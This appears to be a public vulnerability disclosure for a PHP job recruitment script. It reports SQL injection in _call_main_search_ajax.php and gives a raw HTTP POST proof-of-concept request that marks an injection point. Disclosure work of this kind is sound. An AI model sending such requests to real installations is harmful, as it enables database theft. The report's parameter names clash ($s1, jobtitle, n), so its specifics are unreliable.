# job-recruitment-in-php has sql injection vulnerability in \_call_main.php via $s1 parameter

## supplier 
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
\_call_main_search_ajax.php via $s1 parameter

## describe

In /\_parse/\_call_main_search_ajax.php,there is a sql injection vulnerability. The parameters that can be controlled:  $s1. This function executes the jobtitle parameter into the SQL statement without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analysis**    

When the parameter value of   $s1  is obtained in the call_main_search_ajax.php, it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

![image-20241231163833127](https://github.com/user-attachments/assets/884867a2-7ede-4a35-aebd-184c8413738a)

## POC

```
POST /_parse/_call_main_search_ajax.php HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8, zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Origin: http://airecruitmentsystem
Connection: close
Referer: http://airecruitmentsystem/_parse/_all_edits.php
Cookie: PHPSESSID=etso55q58ionvmrvpetmaf8urt
Upgrade-Insecure-Requests: 1
Priority: u=0, i

n=1*
```

![image-20241231165235937](https://github.com/user-attachments/assets/c913003b-f50a-47e7-bdbd-7353ece3fbeb)![image-20241225005108179](https://github.com/user-attachments/assets/7084d4b4-70df-43a0-80bb-cd2a7838e754)

**Discover**

西安电子科技大学： 李腾，谢亚轩，刘芮彤